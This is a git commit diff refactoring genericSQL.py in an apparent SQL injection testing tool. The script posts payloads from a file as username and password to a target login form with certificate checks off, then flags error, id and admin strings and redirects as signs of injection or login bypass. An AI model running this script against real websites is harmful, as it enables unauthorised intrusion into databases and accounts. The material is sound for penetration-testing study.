85e510a78a5780007b2778244225df923ffd114f
Heisenberg <97875042+HeisenbergCipherCracker@users.noreply.github.com>
2023-11-17 00:50:00 +0000

    Fixes #56

--- lib/scripts/genericSQL.py
+++ lib/scripts/genericSQL.py
@@ -1,19 +1,49 @@
 import sys
-# sys.path.append(r"D:\SQLjj\SQLJ\Database")
-# from database import main_prog,extraction
-import asyncio
-import requests
-from colorama import Fore,init
-import re
-import glob
 import os
-import socket
-import time
-from datetime import datetime
-import sqlite3
-import logging
-# from database import create_database_for_Captures
-logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)
+parent_dir = os.path.dirname(os.path.abspath(__file__))
+sys.path.append(parent_dir)
+current_directory = os.path.dirname(os.path.abspath(__file__))
+project_root = os.path.abspath(os.path.join(current_directory, '..'))
+sys.path.append(project_root)
+
+from regelexpression.patterns import Detect
+
+()
+add_directory = os.path.abspath(os.path.dirname(__file__))
+
+priority_path = os.path.join(add_directory, '..', 'priority')
+
+sys.path.append(priority_path)
+
+
+from Priority import PRIORITY, HARMFULL
+
+
+current_directory = os.path.dirname(os.path.abspath(__file__))
+project_root = os.path.abspath(os.path.join(current_directory, '..', '..'))
+
+sys.path.append(project_root)
+
+from logger.logs import logger
+from Exceptions.exceptions import SQLJNGUserExit
+from Exceptions.handler import extract_package_name_from_import_error,Install_missing_packages
+
+
+try:
+    import asyncio
+    import requests
+    from colorama import Fore,init
+    import re
+    import glob
+    import os
+    import socket
+    import time
+    from datetime import datetime
+    import sqlite3
+    import logging
+
+except ImportError as e:
+    Install_missing_packages(str(e))
 
 init()
 
@@ -25,13 +55,11 @@ attack_type = "generic SQL injection"
               Reference : https://github.com/payloadbox/sql-injection-payload-list 
               for The payloads"""
 
-##################################################################
 
 pattern = r"\\berror\\b"
 htmlpattern = r"\\bid\\b"
 generic_capture = []
 
-#######################################################################
 
 
             
@@ -41,9 +69,7 @@ async def generic_sql_attack(urls):
     """This attack is when we are able to alter the database tables and gather information out of it"""
     try:
         global pattern,htmlpattern
-        ##################################################################################
         #
-        #######################################################################################
         filename = "genericsql.txt"
         current_directory = os.path.dirname(os.path.abspath(__file__))
         file_path = os.path.join(current_directory, filename)
@@ -59,164 +85,75 @@ async def generic_sql_attack(urls):
             req = requests.get(urls,verify=False)
             if req.status_code == 200:
                 ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls} \n Do you want to send the payload to the website? ")
-                logging.info(f"The host is up:{urls},Time:{datetime.now()},attack:{attack_type}")
+                logger.info(f"Host is up with the url:{urls}")
 
                 if ask.lower() == "y":
                     for line in sorted_payload.split("\n"):
-                        #############################################################33
                         params = {
                             "username": line,
                             "password": line
                         }
-                        ##############################################################################
-                        # print(line)
                         global ack
                         ack = requests.post(url=urls, data=params,verify=False)
-                        print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code,"|Attack:|",attack_type)
-                        logging.info(f"Sending payloads to the website:{urls},Time:{datetime.now()},attack:{attack_type}")
-                        print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
+                        logger.info(f"Testing payload :{line} into the target...")
                         await asyncio.sleep(5)
                         if "error" in ack.text:
-                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:","Attack:|",attack_type)
-                            logging.info(f"Could found return that appeared to be injectable,Attack:{attack_type},Time:{datetime.now()}")
+                            logger.info(f"Could find parameter Error, keyword:{line}")
+                            Detect(ack.text)
+                            await asyncio.sleep(3)
                             
                         vuln = re.findall(pattern=pattern,string=str(ack.text),flags=re.IGNORECASE)
                         htmlVULN = re.findall(pattern=htmlpattern,string=str(ack.text),flags=re.IGNORECASE)
                         if vuln:
-                            print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found in the data: |", vuln," | with the count of: |",len(vuln)if len(str(htmlVULN)) != 0 else "Nothing found ","|Attack:|",attack_type)
-                            logging.info(f"Found the error parameter in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
+                            logger.info(f"Could find id parameter, keyword:{line}")
+                            Detect(ack.text)
                             await asyncio.sleep(3)
                         
                         if htmlVULN:
-                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in html status:|",htmlVULN,"|with the count of:|",  len(htmlVULN) if len(str(htmlVULN)) != 0 else "|Nothing found|","|attack:|",attack_type)
-                            logging.info(f"Found the error parameter in the target:{urls},Time:{datetime.now()},attack:{attack_type}html doc")
+                            logger.info(f"Could find error parameter, keyword:{line}")
+                            Detect(ack.text)
                             await asyncio.sleep(3)
-                            htmlVulnerbale = True
                             
                     
-                        # htmlVulner
                         word = "id" in req.text
                         errword = "error" in req.text
                         if word:
-                            print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found|:",str("error" in req.text),"with the count of:",len(htmlVULN),"|Attack:|",attack_type)
-                            logging.info(f"Found the id parameter in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
+                            logger.info(f"Could find injectable parameter(id), keyword:{line}")
+                            Detect(req.text)
+                            Detect(ack.text)
                             await asyncio.sleep(3)
-                            # databaseVuln = True
                         
                         if errword:
-                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:",str("id" in req.text),"with the count of:",len(htmlVULN),"|Attack:|",attack_type)
-                            logging.info(f"Found the error parameter in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
-                            await asyncio.sleep(3)
-                            # databaseVuln = True
-                            
-                        
+                            logger.info(f"Could find injectable parameter(error), keyword:{line}")
+                            Detect(req.text)
+                            Detect(ack.text)
+                            await asyncio.sleep(3)            
                             
                     if req.status_code == 302:
-                        print(f"[{datetime.now()}]","Could inject the sq;; to the website:",line,"|Attack:|",attack_type)
-                        logging.info(f"Could bypass the login in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
-                        done = True  
+                        logger.info(f"Could inject parameter,keyword:{line},target:{urls}")            
                         
                     if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
-                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|",attack_type)       
-                        logging.info(f"Could find admin parameter appears to be injectable in the target:{urls},Time:{datetime.now()},attack:{attack_type}")                        
-                        # done = True    
-        # await create_database_for_Captures()
-        conn = sqlite3.connect("SQLJresult.db")
-        cur = conn.cursor()
-
-        sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
-        # values = [attack_type,(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
-        values = [(attack_type, str(ack.text)), (attack_type, str(headers)), (attack_type, str(ack.status_code)), (attack_type, str(vuln)), (attack_type, str(htmlVULN)), (attack_type, str(errword)), (attack_type, str(word)), (attack_type, str(req.status_code)), (attack_type, str(ack.text))]
-
-        cur.executemany(sql, values)
-
-        conn.commit()
-        conn.close()      
+                        logger.info(f"Could find parameter admin, keyword:{line},target:{urls}")                                   
+    
 
     except Exception as e:
-        print(f"[{datetime.now()}]  Error: {str(e)}")
-        logging.info(f"Error: {str(e)}")
+        logger.error(f"Error: {str(e)}")
         
-    except UnicodeEncodeError:
-        pass
+
     
     except KeyboardInterrupt:
-        pass
+        logger.info("Aborted.")
     
-        # ch = input(f"[{datetime.now()}]",Fore.RED+"[!] Are you sure that you want to exit?")
-        # if ch == "y":
-        #     raise SystemExit
-        # else:
-        #     pass
-        
-    except ConnectionAbortedError as e:
-        print(f"[{datetime.now()}]","[ERROR]ConnectionAbortedError:",e)
-        logging.error(f"{datetime.now()} [ERROR]{e}")
-        
-    except ConnectionError as e:
-        print(f"[{datetime.now()}]","[ERROR]ConnectionError:",e)
-        logging.error(f"{datetime.now()} [ERROR]{e}")
-        
-    except ConnectionRefusedError as e:
-        print(f"[{datetime.now()}]","[ERROR]ConnectionRefusedError",e)
-        logging.error(f"{datetime.now()} [ERROR]{e}")
-        
-    except ConnectionResetError as e:
-        print(f"[{datetime.now()}]","[ERROR]ConnectionResetError:",e)
-        logging.error(f"{datetime.now()} [ERROR]{e}")
-        
-    except KeyboardInterrupt:
-        # ch = input(f"[{datetime.now()}]",Fore.RED+"[!] Are you sure that you want to exit?")
-        # if ch == "y":
-        #     raise SystemExit
-        pass
     
-    except MemoryError:
-        import psutil
-        # Get the system memory information
-        memory = psutil.virtual_memory()
-
-        # Calculate the threshold for 80% memory usage
-        threshold = memory.total * 0.9
-
-        # Check if the used memory is greater than the threshold
-        Err =  memory.used <= threshold
-        while not Err:
-            memory = psutil.virtual_memory()
-            Err = memory.used <= threshold
-            print("Please Release you RAM space to continue the application")
-            await asyncio.sleep(5)
-# asyncio.run(Memory_handling())
-       
-    
-    except Exception as e:
-        print(f" {datetime.now()} Error: {str(e)}")
-        logging.error(f"Error: {str(e)}")
+ 
         
         
     finally:
-        pass
-        # global generic_capture
-        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
-        #             \n{ack.text}\n     """)
-        # generic_capture.append(ack.text)
-        # print(Fore.RED+"wrote")
-        # print(generic_capture)
-        # with open("captures.txt","w") as file:
-        #     file.write(ack.text)
-        #     if databaseVuln is True:
-        #         file.write("[INFO] database is vulnerable")
-            
-        #     if htmlVulnerbale is True:
-        #         file.write("[INFO] html is vulnerable")
-                
-        
-        
-        
+        logger.info("Done.")
+
 
 # asyncio.run(generic_sql_attack("https://redtiger.labs.overthewire.org/"))
-# if __name__ != "main":
-#     pass      
+    
 
 
 
